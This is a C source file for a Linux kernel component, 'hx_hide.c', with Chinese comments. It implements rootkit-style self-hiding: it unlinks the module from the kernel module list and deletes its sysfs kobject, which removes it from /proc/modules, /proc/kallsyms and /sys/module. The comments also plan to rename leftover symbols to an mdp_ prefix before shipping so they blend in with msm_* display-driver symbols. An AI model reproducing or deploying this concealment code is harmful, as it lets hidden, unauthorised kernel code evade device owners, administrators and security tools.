// SPDX-License-Identifier: GPL-2.0
/*
 * hx_hide.c — 隐身层
 *
 * 两种构建形态行为完全不同：
 *
 *   [模块形态 obj-m]
 *     有 struct module，`/proc/modules`、`/sys/module/<name>`、`/proc/kallsyms`
 *     里都能看见它，所以要摘链 + kobject_del。
 *
 *   [编进内核 obj-y]
 *     THIS_MODULE 是 NULL（没有 module 结构），上面那些地方本来就不会出现 hx，
 *     不需要也不能摘链。唯一残留是 /proc/kallsyms 里多出 hx_init 等符号 ——
 *     和 msm_* 混在一起，而且出货前会把前缀改名成 mdp_。
 *
 * 注意：`#ifdef MODULE` 是按「当前是否在编模块」判断的，obj-y 时不成立。
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/mm.h>

#include "hx.h"
#include "hx_internal.h"

int hx_hide_self(void)
{
#ifdef MODULE
	struct module *m = THIS_MODULE;
	struct kobject *kobj;

	if (!(g_cfg.flags & HX_FLAG_HIDE_SELF))
		return 0;

	/* 1) /proc/modules 与 /proc/kallsyms 的模块段：
	 *    kernel/module/*.c 里这两处都走 modules 链表，摘掉即消失。
	 *    用 list_del_init 而不是 list_del：重复 hide 时不踩野指针。
	 */
	if (!list_empty(&m->list))
		list_del_init(&m->list);

	/* 2) /sys/module/<name>：删 kobject，目录连同 attributes 一起消失。 */
	kobj = &m->mkobj.kobj;
	if (kobj->parent)
		kobject_del(kobj);

	return 0;
#else
	/* 编进内核：没有模块实体，/proc/modules 与 /sys/module 里本来就没有 hx。
	 * 这里只留一个日志级别的提示，实际不需要做任何事。 */
	return 0;
#endif
}
